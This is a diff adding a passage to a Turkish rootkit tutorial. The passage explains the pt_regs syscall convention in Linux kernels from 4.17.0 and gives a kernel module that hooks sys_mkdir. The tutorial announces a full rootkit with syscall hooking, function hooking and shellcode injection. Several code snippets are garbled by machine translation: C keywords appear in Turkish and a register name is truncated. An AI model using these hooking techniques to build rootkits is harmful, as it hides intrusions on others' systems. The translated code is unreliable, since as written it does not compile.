@@ -203,9 +203,110 @@ Hepsi usermod için iyidir, peki ya kernel? Rootkitlerimiz çekirdek bağlamınd
 
 Ne yazık ki, işlerin biraz farklı olmaya başladığı yer burası. 64 bitlik çekirdek sürümleri `4.17.0` ve üzeri, sistem çağrılarının kernel tarafından işlenme biçimi değişti. İlk olarak, eski yönteme bakacağız çünkü bu,` Ubuntu 16.04` gibi dağıtımlar için hala geçerli ve eski yöntem mantığı oturduğunda daha yeni sürümün anlaşılması çok daha kolay.
 
+Çekirdekteki `sys_read` için kaynak koduna bakarsak, şunu görürüz:
+
+```
+asmlinkage uzun sys_read (işaretsiz int fd, char __user * buf, size_t sayısı);
+```
+
+2016'da, argümanlar sisteme tam olarak göründüğü gibi aktarıldı. `Sys_read` için bir hook yazıyor olsaydık, bu işlev bildirimini kendimiz taklit etmemiz gerekirdi ve (kancayı bir kez yerine koyduğumuzda), bu argümanlarla istediğimiz gibi oynayabilirdik.
+
+(64 bit) kernel sürüm `4.17.0` ile bu durum değişti. İlk önce kullanıcı tarafından yazmaçlarda depolanan argümanlar `pt_regs` adlı özel bir yapıya kopyalanır ve sonra sistem çağrısina iletilen tek şey budur. Sistem çağrısı daha sonra ihtiyaç duyduğu argümanları bu yapıdan çıkarmaktan sorumludur. Ptrace.h dosyasına göre aşağıdaki biçime sahiptir:
+
+```
+struct pt_regs {
+    işaretsiz uzun bx;
+    işaretsiz uzun cx;
+    işaretsiz uzun dx;
+    işaretsiz uzun si;
+    işaretsiz uzun di;
+    / * anlaşılır olması için yeniden düzenlendi * /
+};
+
+```
+
+
+Bu, `sys_read` durumunda şuna benzer bir şey yapmamız gerektiği anlamına gelir:
+
+```
+asmlinkage uzun sys_read (const struct pt_regs * regs)
+{
+    int fd = regs-> di;
+    char __user * buf = regs-> si;
+    size_t count = regs-> d;
+    / * işlevin geri kalanı * /
+}
+
+```
+
+Tabii ki, kernel bizim için işi yaptığından, gerçek `sys_read`'in bunu yapmasına gerek yoktur. Ancak bir hook fonksiyonu yazarken argümanları bu şekilde ele almamız gerekecek.
+
+Bu kadar temel bilgiden sorna, artık rootkitimizin yapacağı temel işlevleri olulşturmaya başlıyabiliriz. Bu makalenin sonunda tam işlevli bir rootkit yazmış olacağız.
+
+
+# II.Rootkit İşlevleri
+
+
+*syscallhooking*
+*function hooking*
+*process shellcode injection*
 
 
 
+### 1. Syscallhooking
+
+Tüm bunların dışında, bir hadi bir `function hook` yazmaya başlayalım! `Sys_mkdir` için, oluşturulmakta olan dizinin adını kernel buffer ına yazdıran çok basit bir hook oluşturmak için yukarıdaki iki yöntemi dikkate alacağız. Daha sonra gerçek `sys_mkdir` yerine bu hook fonksiyonu geçireceğiz.
+
+Öncelikle, hangi kernel sürümünü derlediğimizi kontrol etmemiz gerekecek - `linux/version.h` bu konuda bize yardımcı olacaktır. Ardından işleri bizim için basitleştirmek için bir dizi `önişlemci makrosu` kullanacağız.
+
+```
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/syscalls.h>
+#include <linux/version.h>
+#include <linux/namei.h>
+
+MODULE_LICENSE("GPL");
+MODULE_VERSION("0.01");
+
+#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
+#define PTREGS_SYSCALL_STUBS 1
+#endif
+
+#ifdef PTREGS_SYSCALL_STUBS
+static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
+
+asmlinkage int hook_mkdir(const struct pt_regs *regs)
+{
+    char __user *pathname = (char *)regs->di;
+    char dir_name[NAME_MAX] = {0};
+
+    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
+
+    if (error > 0)
+        printk(KERN_INFO "rootkit: trying to create directory with name: %s\n", dir_name);
+
+    orig_mkdir(regs);
+    return 0;
+}
+#else
+static asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);
+
+asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode)
+{
+    char dir_name[NAME_MAX] = {0};
+
+    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
+
+    if (error > 0)
+        printk(KERN_INFO "rootkit: trying to create directory with name %s\n", dir_name);
+
+    orig_mkdir(pathname, mode);
+    return 0;
+}
+#endif
+```
 
 
 
